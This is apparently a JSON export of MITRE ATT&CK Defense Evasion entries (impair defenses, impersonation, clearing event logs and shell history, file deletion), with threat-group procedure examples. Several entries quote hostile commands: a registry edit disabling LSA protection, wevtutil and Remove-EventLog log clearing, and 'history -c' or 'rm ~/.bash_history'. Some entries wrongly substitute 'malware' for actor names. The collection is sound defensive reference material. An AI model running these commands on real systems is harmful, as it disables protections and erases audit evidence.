        "tactic": "Defense Evasion",
        "description": "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out of a computer or stopping it from being shut down. These restrictions can further enable malicious operations as well as the continued propagation of incidents.[1]Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.",
        "Procedure": {
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware has disabled LSA protection on compromised hosts using \"reg\" add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f.[2]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware reduces the integrity level of objects to allow write actions.[3]"
            }
        }
    },
    "T1656": {
        "ttp_name": "Impersonation",
        "ttp_id": "T1656",
        "href": "/techniques/T1656",
        "tactic": "Defense Evasion",
        "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via Phishing for Information, Phishing, or Internal Spearphishing) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary\u2019s ultimate goals, possibly against multiple victims. In many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables Financial Theft.Adversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as payment, request, or urgent to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary\u2019s goal.\u202f\u202f Impersonation is typically preceded by reconnaissance techniques such as Gather Victim Identity Information and Gather Victim Org Information as well as acquiring infrastructure such as email domains (i.e. Domains) to substantiate their false identity.[1]There is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may Compromise Accounts targeting one organization which can then be used to support impersonation against other entities.[2]",
        "Procedure": {
            "C0027": {
                "ID": "C0027",
                "Name": "C0027",
                "Description": "During malware, Scattered Spider impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools.[3]"
            },
            "G1004": {
                "ID": "G1004",
                "Name": "LAPSUS$",
                "Description": "malware has called victims' help desk and impersonated legitimate users with previously gathered information in order to gain access to privileged accounts.[4]"
            },
            "C0022": {
                "ID": "C0022",
                "Name": "Operation Dream Job",
                "Description": "During malware, Lazarus Group impersonated HR hiring personnel through LinkedIn messages and conducted interviews with victims in order to deceive them into downloading malware.[5][6][7]"
            },
            "G1015": {
                "ID": "G1015",
                "Name": "Scattered Spider",
                "Description": "During C0027, malware impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools.[3]malware utilized social engineering to compel IT help desk personnel to reset passwords and MFA tokens.[8][9]"
            }
        }
    },
    "T1070": {
        "ttp_name": "Indicator Removal",
        "ttp_id": "T1070",
        "href": "/techniques/T1070",
        "subtechnique": {
            "001": {
                "name": "Clear Windows Event Logs",
                "href": "/techniques/T1070/001",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.With administrator privileges, the event logs can be cleared with the following utility commands:wevtutil cl systemwevtutil cl applicationwevtutil cl securityThese logs may also be cleared through other mechanisms, such as the event viewer GUI or PowerShell. For example, adversaries may use the PowerShell command Remove-EventLog -LogName Security to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.[1]Adversaries may also attempt to clear logs by directly deleting the stored log files within C:\\Windows\\System32\\winevt\\logs\\.",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has cleared event logs, including by using the commands wevtutil cl System and wevtutil cl Security.[2][3]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has cleared select event log entries.[4]"
                    },
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> clears Window Event logs and Sysmon logs from the system.[5]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> attempted to remove evidence of some of its activity by clearing Windows security and system events.[6]"
                    },
                    "S1068": {
                        "ID": "S1068",
                        "Name": "BlackCat",
                        "Description": "<name> can clear Windows event logs using wevtutil.exe.[7]"
                    },
                    "S0089": {
                        "ID": "S0089",
                        "Name": "BlackEnergy",
                        "Description": "The <name> component KillDisk is capable of deleting Windows Event Logs.[8]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has cleared event logs on compromised hosts.[9]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has cleared Windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs. The actors also deleted specific Registry keys.[10]"
                    },
                    "G0053": {
                        "ID": "G0053",
                        "Name": "FIN5",
                        "Description": "<name> has cleared event logs from victims.[11]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has cleared logs during post compromise cleanup activities.[12]"
                    },
                    "S0182": {
                        "ID": "S0182",
                        "Name": "FinFisher",
                        "Description": "<name> clears the system event logs using  OpenEventLog/ClearEventLog APIs .[13][14]"
                    },
                    "S0032": {
                        "ID": "S0032",
                        "Name": "gh0st RAT",
                        "Description": "<name> is able to wipe event logs.[15][16]"
                    },
                    "S0697": {
                        "ID": "S0697",
                        "Name": "HermeticWiper",
                        "Description": "<name> can overwrite the C:\\Windows\\System32\\winevt\\Logs file on a targeted system.[17]"
                    },
                    "S0698": {
                        "ID": "S0698",
                        "Name": "HermeticWizard",
                        "Description": "<name> has the ability to use wevtutil cl system to clear event logs.[17]"
                    },
                    "S0203": {
                        "ID": "S0203",
                        "Name": "Hydraq",
                        "Description": "<name> creates a backdoor through which remote attackers can clear all system event logs.[18][19]"
                    },
                    "G0119": {
                        "ID": "G0119",
                        "Name": "Indrik Spider",
                        "Description": "<name> has used Cobalt Strike to empty log files.[20]"
                    },
                    "S0607": {
                        "ID": "S0607",
                        "Name": "KillDisk",
                        "Description": "<name> deletes Application, Security, Setup, and System Windows Event Logs.[8]"
                    },
                    "S0532": {
                        "ID": "S0532",
                        "Name": "Lucifer",
                        "Description": "<name> can clear and remove event logs.[21]"
                    },
                    "S1060": {
                        "ID": "S1060",
                        "Name": "Mafalda",
                        "Description": "<name> can delete Windows Event logs by invoking the OpenEventLogW and ClearEventLogW functions.[22]"
                    },
                    "S0688": {
                        "ID": "S0688",
                        "Name": "Meteor",
                        "Description": "<name> can use Wevtutil to remove Security, System and Application Event Viewer logs.[23]"
                    },
                    "S0368": {
                        "ID": "S0368",
                        "Name": "NotPetya",
                        "Description": "<name> uses wevtutil to clear the Windows event logs.[24][25]"
                    },
                    "S0365": {
                        "ID": "S0365",
                        "Name": "Olympic Destroyer",
                        "Description": "<name> will attempt to clear the System and Security event logs using wevtutil.[26]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, the threat actors deleted all Windows system and security event logs using /Q /c wevtutil cl system and /Q /c wevtutil cl security.[27]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> has a module to clear event logs with PowerShell.[28]"
                    },
                    "S0253": {
                        "ID": "S0253",
                        "Name": "RunningRAT",
                        "Description": "<name> contains code to clear event logs.[29]"
                    },
                    "S0242": {
                        "ID": "S0242",
                        "Name": "SynAck",
                        "Description": "<name> clears event logs.[30]"
                    },
                    "S0645": {
                        "ID": "S0645",
                        "Name": "Wevtutil",
                        "Description": "<name> can be used to clear system and security event logs from the system.[31][2]"
                    },
                    "S0412": {
                        "ID": "S0412",
                        "Name": "ZxShell",
                        "Description": "<name> has a command to clear system event logs.[32]"
                    }
                }
            },
            "002": {
                "name": "Clear Linux or Mac System Logs",
                "href": "/techniques/T1070/002",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the /var/log/ directory. Subfolders in this directory categorize logs by their related functions, such as:[1]/var/log/messages:: General and system-related messages/var/log/secure or /var/log/auth.log: Authentication logs/var/log/utmp or /var/log/wtmp: Login records/var/log/kern.log: Kernel logs/var/log/cron.log: Crond logs/var/log/maillog: Mail server logs/var/log/httpd/: Web server access and error logs",
                "Procedure": {
                    "S1016": {
                        "ID": "S1016",
                        "Name": "MacMa",
                        "Description": "<name> can clear possible malware traces such as application logs.[2]"
                    },
                    "S0279": {
                        "ID": "S0279",
                        "Name": "Proton",
                        "Description": "<name> removes logs from /var/logs and /Library/logs.[3]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name> has cleared log files within the /var/log/ folder.[4]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has removed system logs from /var/log/syslog.[5]"
                    }
                }
            },
            "003": {
                "name": "Clear Command History",
                "href": "/techniques/T1070/003",
                "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable HISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history. The benefit of this is that it allows users to go back to commands they've used before in different sessions.Adversaries may delete their commands from these logs by manually clearing the history (history -c) or deleting the bash history file rm ~/.bash_history.  Adversaries may also leverage a Network Device CLI on network devices to clear command history data (clear logging and/or clear history).[1]On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the PSReadLine module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.The PSReadLine command history tracks the commands used in all PowerShell sessions and writes them to a file ($env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.[2]Adversaries may run the PowerShell command Clear-History to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the ConsoleHost_history.txt file. Adversaries may also delete the ConsoleHost_history.txt file or edit its contents to hide PowerShell commands they have run.[3][4]",
                "Procedure": {
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> attempted to remove evidence of some of its activity by deleting Bash histories.[5]"
                    },
                    "G1023": {
                        "ID": "G1023",
                        "Name": "APT5",
                        "Description": "<name> has cleared the command history on targeted ESXi servers.[6]"
                    },
                    "S0601": {
                        "ID": "S0601",
                        "Name": "Hildegard",
                        "Description": "<name> has used history -c to clear script shell logs.[7]"
                    },
                    "S0641": {
                        "ID": "S0641",
                        "Name": "Kobalos",
                        "Description": "<name> can remove all command history on compromised hosts.[8]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has routinely deleted log files on a compromised router, including automatic log deletion through the use of the logrotate utility.[9]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has removed mailbox export requests from compromised Exchange servers.[10]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has used Wevtutil to remove PowerShell execution logs.[11]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has cleared command history with history -c.[12][13]"
                    }
                }
            },
            "004": {
                "name": "File Deletion",
                "href": "/techniques/T1070/004",
                "description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.[1] Examples of built-in Command and Scripting Interpreter functions include del on Windows and rm or unlink on Linux and macOS.",
                "Procedure": {
                    "C0028": {
                        "ID": "C0028",
                        "Name": "2015 Ukraine Electric Power Attack",
                        "Description": "During the <name>, vba_macro.exe deletes itself after FONTCACHE.DAT, rundll32.exe, and the associated .lnk file is delivered. [2]"
                    },
                    "S0045": {
                        "ID": "S0045",
                        "Name": "ADVSTORESHELL",
                        "Description": "<name> can delete files and directories.[3]"
                    },
                    "S0504": {
                        "ID": "S0504",
                        "Name": "Anchor",
                        "Description": "<name> can self delete its dropper after the malware is successfully deployed.[4]"
                    },
                    "S0584": {
                        "ID": "S0584",
                        "Name": "AppleJeus",
                        "Description": "<name> has deleted the MSI file after installation.[5]"
                    },
                    "S0622": {
                        "ID": "S0622",
                        "Name": "AppleSeed",
                        "Description": "<name> can delete files from a compromised host after they are exfiltrated.[6]"
                    },
                    "G0026": {
                        "ID": "G0026",
                        "Name": "APT18",
                        "Description": "<name> actors deleted tools and batch files from victim systems.[7]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has intentionally deleted computer files to cover their tracks, including with use of the program CCleaner.[8]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has used SDelete to remove artifacts from victim networks.[9]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> has a tool that can delete files.[10]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name>'s macOS backdoor can receive a \"delete\" command.[11]"
                    },
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has used a utility called CLOSESHAVE that can securely delete a file from the system. They have also removed malware, tools, or other non-native files used during the intrusion to reduce their footprint or as part of the post-intrusion cleanup process.[12][13]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has used malware to delete files after they are deployed on a compromised host.[14]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> deleted files from the system.[15][16]"
                    },
                    "G1023": {
                        "ID": "G1023",
                        "Name": "APT5",
                        "Description": "<name> has deleted scripts and web shells to evade detection.[17][18]"
                    },
                    "G0143": {
                        "ID": "G0143",
                        "Name": "Aquatic Panda",
                        "Description": "<name> has deleted malicious executables from compromised machines.[19]"
                    },
                    "S0456": {
                        "ID": "S0456",
                        "Name": "Aria-body",
                        "Description": "<name> has the ability to delete files and directories on compromised hosts.[20]"
                    },
                    "S0438": {
                        "ID": "S0438",
                        "Name": "Attor",
                        "Description": "<name>\u2019s plugin deletes the collected files and log files after exfiltration.[21]"
                    },
                    "S0347": {
                        "ID": "S0347",
                        "Name": "AuditCred",
                        "Description": "<name> can delete files from the system.[22]"
                    },
                    "S0344": {
                        "ID": "S0344",
                        "Name": "Azorult",
                        "Description": "<name> can delete files from victim machines.[23]"
                    },
                    "S0414": {
                        "ID": "S0414",
                        "Name": "BabyShark",
                        "Description": "<name> has cleaned up all files associated with the secondary payload execution.[24]"
                    },
                    "S0475": {
                        "ID": "S0475",
                        "Name": "BackConfig",
                        "Description": "<name> has the ability to remove files and folders related to previous infections.[25]"
                    },
                    "S0093": {
                        "ID": "S0093",
                        "Name": "Backdoor.Oldrea",
                        "Description": "<name> contains a cleanup module that removes traces of itself from the victim.[26]"
                    },
                    "S1081": {
                        "ID": "S1081",
                        "Name": "BADHATCH",
                        "Description": "<name> has the ability to delete PowerShell scripts from a compromised machine.[27]"
                    },
                    "S0234": {
                        "ID": "S0234",
                        "Name": "Bandook",
                        "Description": "<name> has a command to delete a file.[28]"
                    },
                    "S0239": {
                        "ID": "S0239",
                        "Name": "Bankshot",
                        "Description": "<name> marks files to be deleted upon the next system reboot and uninstalls and removes itself from the system.[29]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> can delete its loader using a batch file in the Windows temporary folder.[30]"
                    },
                    "S0127": {
                        "ID": "S0127",
                        "Name": "BBSRAT",
                        "Description": "<name> can delete files and directories.[31]"
                    },
                    "S0268": {
                        "ID": "S0268",
                        "Name": "Bisonal",
                        "Description": "<name> will delete its dropper and VBS scripts from the victim\u2019s machine.[32][33][34]"
                    },
                    "S0069": {
                        "ID": "S0069",
                        "Name": "BLACKCOFFEE",
                        "Description": "<name> has the capability to delete files.[35]"
                    },
                    "S0520": {
                        "ID": "S0520",
                        "Name": "BLINDINGCAN",
                        "Description": "<name> has deleted itself and associated artifacts from victim machines.[36]"
                    },
                    "S0657": {
                        "ID": "S0657",
                        "Name": "BLUELIGHT",
                        "Description": "<name> can uninstall itself.[37]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "The <name> uploader or malware the uploader uses command to delete the RAR archives after they have been exfiltrated.[38]"
                    },
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "<name> can uninstall its loader through the use of a Sdl command.[39]"
                    },
                    "C0032": {
                        "ID": "C0032",
                        "Name": "C0032",
                        "Description": "During the <name> campaign, TEMP.Veles routinely deleted tools, logs, and other files after they were finished with them.[40]"
                    },
                    "S0274": {
                        "ID": "S0274",
                        "Name": "Calisto",
                        "Description": "<name> has the capability to use rm -rf to remove folders and files from the victim's machine.[41]"
                    },
                    "S0030": {
                        "ID": "S0030",
                        "Name": "Carbanak",
                        "Description": "<name> has a command to delete files.[42]"
                    },
                    "S0348": {
                        "ID": "S0348",
                        "Name": "Cardinal RAT",
                        "Description": "<name> can uninstall itself, including deleting its executable.[43]"
                    },
                    "S0462": {
                        "ID": "S0462",
                        "Name": "CARROTBAT",
                        "Description": "<name> has the ability to delete downloaded files from a compromised host.[44]"
                    },
                    "S1043": {
                        "ID": "S1043",
                        "Name": "ccf32",
                        "Description": "<name> can delete files and folders from compromised machines.[45]"
                    },
                    "S0674": {
                        "ID": "S0674",
                        "Name": "CharmPower",
                        "Description": "<name> can delete created files from a compromised system.[46]"
                    },
                    "S0107": {
                        "ID": "S0107",
                        "Name": "Cherry Picker",
                        "Description": "Recent versions of <name> delete files and registry keys created by the malware.[47]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has performed file deletion to evade detection.[48]"
                    },
                    "S0106": {
                        "ID": "S0106",
                        "Name": "cmd",
                        "Description": "<name> can be used to delete files from the file system.[49]"
                    },
                    "S1105": {
                        "ID": "S1105",
                        "Name": "COATHANGER",
                        "Description": "<name> removes files from victim environments following use in multiple instances.[50]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> deleted the DLL dropper from the victim\u2019s machine to cover their tracks.[51]"
                    },
                    "S0115": {
                        "ID": "S0115",
                        "Name": "Crimson",
                        "Description": "<name> has the ability to delete files from a compromised host.[52][53][54]"
                    },
                    "S0498": {
                        "ID": "S0498",
                        "Name": "Cryptoistic",
                        "Description": "<name> has the ability delete files from a compromised host.[55]"
                    },
                    "S0527": {
                        "ID": "S0527",
                        "Name": "CSPY Downloader",
                        "Description": "<name> has the ability to self delete.[56]"
                    },
                    "S0625": {
                        "ID": "S0625",
                        "Name": "Cuba",
                        "Description": "<name> can use the command cmd.exe /c del to delete its artifacts from the system.[57]"
                    },
                    "C0029": {
                        "ID": "C0029",
                        "Name": "Cutting Edge",
                        "Description": "During <name>, threat actors deleted /tmp/test1.txt on compromised Ivanti Connect Secure VPNs which was used to hold stolen configuration and cache files.[58][59]"
                    },
                    "S1014": {
                        "ID": "S1014",
                        "Name": "DanBot",
                        "Description": "<name> can delete its configuration file after installation.[60]"
                    },
                    "S0673": {
                        "ID": "S0673",
                        "Name": "DarkWatchman",
                        "Description": "<name> has been observed deleting its original launcher after installation.[61]"
                    },
                    "S0354": {
                        "ID": "S0354",
                        "Name": "Denis",
                        "Description": "<name> has a command to delete files from the victim\u2019s machine.[62][63]"
                    },
                    "S0021": {
                        "ID": "S0021",
                        "Name": "Derusbi",
                        "Description": "<name> is capable of deleting files. It has been observed loading a Linux Kernel Module (LKM) and then deleting it from the hard disk as well as overwriting the data with null bytes.[64][65]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots.[66]"
                    },
                    "S0502": {
                        "ID": "S0502",
                        "Name": "Drovorub",
                        "Description": "<name> can delete specific files from a compromised host.[67]"
                    },
                    "S0567": {
                        "ID": "S0567",
                        "Name": "Dtrack",
                        "Description": "<name> can remove its persistence and delete itself.[68]"
                    },
                    "S0062": {
                        "ID": "S0062",
                        "Name": "DustySky",
                        "Description": "<name> can delete files it creates from the infected system.[69]"
                    },
                    "S0593": {
                        "ID": "S0593",
                        "Name": "ECCENTRICBANDWAGON",
                        "Description": "<name> can delete log files generated from the malware stored at C:\\windows\\temp\\tmp0207.[70]"
                    },
                    "S0081": {
                        "ID": "S0081",
                        "Name": "Elise",
                        "Description": "<name> is capable of launching a remote shell on the host to delete itself.[71]"
                    },
                    "S0091": {
                        "ID": "S0091",
                        "Name": "Epic",
                        "Description": "<name> has a command to delete a file from the machine.[72]"
                    },
                    "S0396": {
                        "ID": "S0396",
                        "Name": "EvilBunny",
                        "Description": "<name> has deleted the initial dropper after running through the environment checks.[73]"
                    },
                    "G0120": {
                        "ID": "G0120",
                        "Name": "Evilnum",
                        "Description": "<name> has deleted files used during infection.[74]"
                    },
                    "S0401": {
                        "ID": "S0401",
                        "Name": "Exaramel for Linux",
                        "Description": "<name> can uninstall its persistence mechanism and delete its configuration file.[75]"
                    },
                    "S0181": {
                        "ID": "S0181",
                        "Name": "FALLCHILL",
                        "Description": "<name> can delete malware and associated artifacts from the victim.[76]"
                    },
                    "S0512": {
                        "ID": "S0512",
                        "Name": "FatDuke",
                        "Description": "<name> can secure delete its DLL.[77]"
                    },
                    "S0267": {
                        "ID": "S0267",
                        "Name": "FELIXROOT",
                        "Description": "<name> deletes the .LNK file from the startup directory as well as the dropper components.[78]"
                    },
                    "S0679": {
                        "ID": "S0679",
                        "Name": "Ferocious",
                        "Description": "<name> can delete files from a compromised host.[79]"
                    },
                    "G0051": {
                        "ID": "G0051",
                        "Name": "FIN10",
                        "Description": "<name> has used batch scripts and scheduled tasks to delete critical system files.[80]"
                    },
                    "G0053": {
                        "ID": "G0053",
                        "Name": "FIN5",
                        "Description": "<name> uses SDelete to clean up the environment and attempt to prevent detection.[81]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has removed files from victim machines.[82]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has deleted tmp and prefetch files during post compromise cleanup activities. <name> has also deleted PowerShell scripts to evade detection on compromised machines.[83][84]"
                    },
                    "S0381": {
                        "ID": "S0381",
                        "Name": "FlawedAmmyy",
                        "Description": "<name> can execute batch scripts to delete files.[85]"
                    },
                    "S0277": {
                        "ID": "S0277",
                        "Name": "FruitFly",
                        "Description": "<name> will delete files on the system.[86]"
                    },
                    "S1044": {
                        "ID": "S1044",
                        "Name": "FunnyDream",
                        "Description": "<name> can delete files including its dropper component.[45]"
                    },
                    "S0410": {
                        "ID": "S0410",
                        "Name": "Fysbis",
                        "Description": "<name> has the ability to delete files.[87]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> tools can delete files used during an operation.[88][89][90]"
                    },
                    "S0168": {
                        "ID": "S0168",
                        "Name": "Gazer",
                        "Description": "<name> has commands to delete files and persistence mechanisms from the victim.[91][92]"
                    },
                    "S0666": {
                        "ID": "S0666",
                        "Name": "Gelsemium",
                        "Description": "<name> can delete its dropper component from the targeted system.[93]"
                    },
                    "S0032": {
                        "ID": "S0032",
                        "Name": "gh0st RAT",
                        "Description": "<name> has the capability to to delete files.[94][95]"
                    },
                    "S0249": {
                        "ID": "S0249",
                        "Name": "Gold Dragon",
                        "Description": "<name> deletes one of its files, 2.hwp, from the endpoint after establishing persistence.[96]"
                    },
                    "S0493": {
                        "ID": "S0493",
                        "Name": "GoldenSpy",
                        "Description": "<name>'s uninstaller can delete registry entries, files and folders, and finally itself once these tasks have been completed.[97]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> can delete .LNK files created in the Startup folder.[98]"
                    },
                    "S0690": {
                        "ID": "S0690",
                        "Name": "Green Lambert",
                        "Description": "<name> can delete the original executable after initial installation in addition to unused functions.[99][100]"
                    },
                    "S0342": {
                        "ID": "S0342",
                        "Name": "GreyEnergy",
                        "Description": "<name> can securely delete a file by hooking into the DeleteFileA and DeleteFileW functions in the Windows API.[101]"
                    },
                    "S0632": {
                        "ID": "S0632",
                        "Name": "GrimAgent",
                        "Description": "<name> can delete old binaries on a compromised host.[102]"
                    },
                    "G0043": {
                        "ID": "G0043",
                        "Name": "Group5",
                        "Description": "Malware used by <name> is capable of remotely deleting files from victims.[103]"
                    },
                    "S0561": {
                        "ID": "S0561",
                        "Name": "GuLoader",
                        "Description": "<name> can delete its executable from the AppData\\Local\\Temp directory on the compromised host.[104]"
                    },
                    "S0151": {
                        "ID": "S0151",
                        "Name": "HALFBAKED",
                        "Description": "<name> can delete a specified file.[105]"
                    },
                    "S0499": {
                        "ID": "S0499",
                        "Name": "Hancitor",
                        "Description": "<name> has deleted files using the VBA kill function.[106]"
                    },
                    "S0391": {
                        "ID": "S0391",
                        "Name": "HAWKBALL",
                        "Description": "<name> has the ability to delete files.[107]"
                    },
                    "S0697": {
                        "ID": "S0697",
                        "Name": "HermeticWiper",
                        "Description": "<name> has the ability to overwrite its own file with random bites.[108][109]"
                    },
                    "S1027": {
                        "ID": "S1027",
                        "Name": "Heyoka Backdoor",
                        "Description": "<name> has the ability to delete folders and files from a targeted system.[110]"
                    },
                    "S0087": {
                        "ID": "S0087",
                        "Name": "Hi-Zor",
                        "Description": "<name> deletes its RAT installer file as it executes its DLL payload file.[111]"
                    },
                    "S0601": {
                        "ID": "S0601",
                        "Name": "Hildegard",
                        "Description": "<name> has deleted scripts after execution.[112]"
                    },
                    "S0431": {
                        "ID": "S0431",
                        "Name": "HotCroissant",
                        "Description": "<name> has the ability to clean up installed files, delete files, and delete itself from the victim\u2019s machine.[113]"
                    },
                    "S0070": {
                        "ID": "S0070",
                        "Name": "HTTPBrowser",
                        "Description": "<name> deletes its original installer file once installation is complete.[114]"
                    },
                    "S0203": {
                        "ID": "S0203",
                        "Name": "Hydraq",
                        "Description": "<name> creates a backdoor through which remote attackers can delete files.[115][116]"
                    },
                    "S0398": {
                        "ID": "S0398",
                        "Name": "HyperBro",
                        "Description": "<name> has the ability to delete a specified file.[117]"
                    },
                    "S1022": {
                        "ID": "S1022",
                        "Name": "IceApple",
                        "Description": "<name> can delete files and directories from targeted systems.[118]"
                    },
                    "S0434": {
                        "ID": "S0434",
                        "Name": "Imminent Monitor",
                        "Description": "<name> has deleted files related to its dynamic debugger feature.[119]"
                    },
                    "S0259": {
                        "ID": "S0259",
                        "Name": "InnaputRAT",
                        "Description": "<name> has a command to delete files.[120]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> has deleted files and directories including XML and files successfully uploaded to C2 servers.[121][122]"
                    },
                    "S0015": {
                        "ID": "S0015",
                        "Name": "Ixeshe",
                        "Description": "<name> has a command to delete a file from the machine.[123]"
                    },
                    "S0044": {
                        "ID": "S0044",
                        "Name": "JHUHUGIT",
                        "Description": "The <name> dropper can delete itself from the victim. Another <name> variant has the capability to delete specified files.[124][125]"
                    },
                    "S0201": {
                        "ID": "S0201",
                        "Name": "JPIN",
                        "Description": "<name>'s installer/uninstaller component deletes itself if it encounters a version of Windows earlier than Windows XP or identifies security-related processes running.[126]"
                    },
                    "S0283": {
                        "ID": "S0283",
                        "Name": "jRAT",
                        "Description": "<name> has a function to delete files from the victim\u2019s machine.[127]"
                    },
                    "S0265": {
                        "ID": "S0265",
                        "Name": "Kazuar",
                        "Description": "<name> can delete files.[128]"
                    },
                    "S1020": {
                        "ID": "S1020",
                        "Name": "Kevin",
                        "Description": "<name> can delete files created on the victim's machine.[129]"
                    },
                    "S0271": {
                        "ID": "S0271",
                        "Name": "KEYMARBLE",
                        "Description": "<name> has the capability to delete files off the victim\u2019s machine.[130]"
                    },
                    "S0607": {
                        "ID": "S0607",
                        "Name": "KillDisk",
                        "Description": "<name> has the ability to quit and delete itself.[131]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has deleted the exfiltrated data on disk after transmission. <name> has also used an instrumentor script to terminate browser processes running on an infected system and then delete the cookie files on disk.[132][133][134]"
                    },
                    "S0437": {
                        "ID": "S0437",
                        "Name": "Kivars",
                        "Description": "<name> has the ability to uninstall malware from the infected host.[135]"
                    },
                    "S0162": {
                        "ID": "S0162",
                        "Name": "Komplex",
                        "Description": "The <name> trojan supports file deletion.[136]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> can delete files.[137]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> malware has deleted files in various ways, including \"suicide scripts\" to delete malware binaries from the victim. <name> also uses secure file deletion to delete files from the victim.[138][139]"
                    },
                    "S0395": {
                        "ID": "S0395",
                        "Name": "LightNeuron",
                        "Description": "<name> has a function to delete files.[140]"
